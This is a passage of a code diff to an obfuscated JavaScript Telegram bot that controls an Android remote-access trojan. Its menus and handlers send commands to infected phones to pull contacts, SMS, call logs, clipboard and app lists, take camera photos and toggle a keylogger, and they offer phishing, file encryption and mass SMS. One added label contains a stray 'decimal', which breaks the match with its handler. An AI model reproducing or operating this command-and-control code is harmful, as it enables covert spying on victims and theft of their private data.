                               bot.sendMessage(data.id, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                 'parse_mode': "HTML",
                                 'reply_markup': {
-                                  'keyboard': [["📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴", "💬 𝚂𝙼𝚂 🔴"], ["📞 𝙲𝚊𝚕𝚕𝚜 🔴", "📱 𝙰𝚙𝚙𝚜 🔴"], ["📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴", "🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴"], ["🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴", "📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴"], ["🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴", "🔔 𝚃𝚘𝚊𝚜𝚝 🔴"], ["📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴", "📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴"], ["▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴", "⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴"], ["⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴", "🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴"], ["📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴", "🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴"], ["🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴", "🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴"], ["🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴", "🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴"], ["📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴"], ["📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴"], ["🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴"]],
+                                  'keyboard': [["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>"], ["<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>"], ["<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>"], ["<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛 decimal🔴</b>"], ["<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>"], ["<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>"], ["<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>"], ["<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>"], ["<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>"], ["<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>"], ["<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>"], ["<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>"], ["<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]],
                                   'resize_keyboard': true,
                                   'one_time_keyboard': true
                                 }
@@ -438,7 +460,7 @@ bot.on("message", _0xdbde0c => {
                               bot.sendMessage(data.id, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x3202e5 + "</b>\n\n", {
                                 'parse_mode': "HTML",
                                 'reply_markup': {
-                                  'keyboard': [["📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴", "💬 𝚂𝙼𝚂 🔴"], ["📞 𝙲𝚊𝚕𝚕𝚜 🔴", "📱 𝙰𝚙𝚙𝚜 🔴"], ["📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴", "🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴"], ["🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴", "📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴"], ["🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴", "🔔 𝚃𝚘𝚊𝚜𝚝 🔴"], ["📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴", "📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴"], ["▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴", "⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴"], ["⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴", "🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴"], ["📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴", "🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴"], ["🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴", "🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴"], ["🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴", "🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴"], ["📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴"], ["📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴"], ["🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴"]],
+                                  'keyboard': [["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>"], ["<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>"], ["<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>"], ["<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>"], ["<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>"], ["<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>"], ["<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>"], ["<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>"], ["<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>"], ["<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>"], ["<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>"], ["<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>"], ["<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]],
                                   'resize_keyboard': true,
                                   'one_time_keyboard': true
                                 }
@@ -447,7 +469,7 @@ bot.on("message", _0xdbde0c => {
                           } else {
                             if (actions.includes(_0xdbde0c.text)) {
                               let _0x3ea82b = appData.get("currentTarget");
-                              if (_0xdbde0c.text === "📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴") {
+                              if (_0xdbde0c.text === "<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>") {
                                 if (_0x3ea82b == "all") {
                                   io.sockets.emit("commend", {
                                     'request': "contacts",
@@ -463,12 +485,12 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "💬 𝚂𝙼𝚂 🔴") {
+                              if (_0xdbde0c.text === "<b>💬 𝚂𝙼𝚂 🔴</b>") {
                                 if (_0x3ea82b == "all") {
                                   io.to(_0x3ea82b).emit("commend", {
                                     'request': "all-sms",
@@ -484,12 +506,12 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📞 𝙲𝚊𝚕𝚕𝚜 🔴") {
+                              if (_0xdbde0c.text === "<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>") {
                                 if (_0x3ea82b == "all") {
                                   io.sockets.emit("commend", {
                                     'request': "calls",
@@ -505,12 +527,12 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📱 𝙰𝚙𝚙𝚜 🔴") {
+                              if (_0xdbde0c.text === "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>") {
                                 if (_0x3ea82b == "all") {
                                   io.sockets.emit("commend", {
                                     'request': "apps",
@@ -526,12 +548,12 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴") {
+                              if (_0xdbde0c.text === "<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>") {
                                 if (_0x3ea82b == "all") {
                                   io.sockets.emit("commend", {
                                     'request': "main-camera",
@@ -547,12 +569,12 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴") {
+                              if (_0xdbde0c.text === "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>") {
                                 if (_0x3ea82b == 'all') {
                                   io.sockets.emit("commend", {
                                     'request': "selfie-camera",
@@ -568,12 +590,12 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴") {
+                              if (_0xdbde0c.text === "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>") {
                                 if (_0x3ea82b == "all") {
                                   io.sockets.emit("commend", {
                                     'request': "clipboard",
@@ -589,21 +611,21 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴") {
+                              if (_0xdbde0c.text === "<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>") {
                                 bot.sendMessage(data.id, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴") {
+                              if (_0xdbde0c.text === "<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>") {
                                 if (_0x3ea82b == "all") {
                                   io.sockets.emit("commend", {
                                     'request': "keylogger-on",
@@ -619,12 +641,12 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴") {
+                              if (_0xdbde0c.text === "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>") {
                                 if (_0x3ea82b == "all") {
                                   io.sockets.emit("commend", {
                                     'request': "keylogger-off",
@@ -640,160 +662,160 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴") {
+                              if (_0xdbde0c.text === "<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>") {
